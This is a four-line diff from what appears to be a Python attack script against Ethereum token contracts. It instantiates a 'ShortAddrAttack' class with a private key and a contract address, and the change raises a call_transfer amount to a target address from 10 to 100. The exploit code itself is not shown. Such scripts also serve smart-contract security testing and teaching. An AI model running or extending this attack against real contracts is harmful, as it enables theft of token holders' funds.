@@ -106,4 +106,4 @@ if __name__ == "__main__":
     print("#"*len(slogan))
     sAttack = ShortAddrAttack(http_provider_api, priv_key,
                               contract_addr, sol_path, contract_name)
-    sAttack.call_transfer(Web3().toChecksumAddress(target_addr), 10)
+    sAttack.call_transfer(Web3().toChecksumAddress(target_addr), 100)
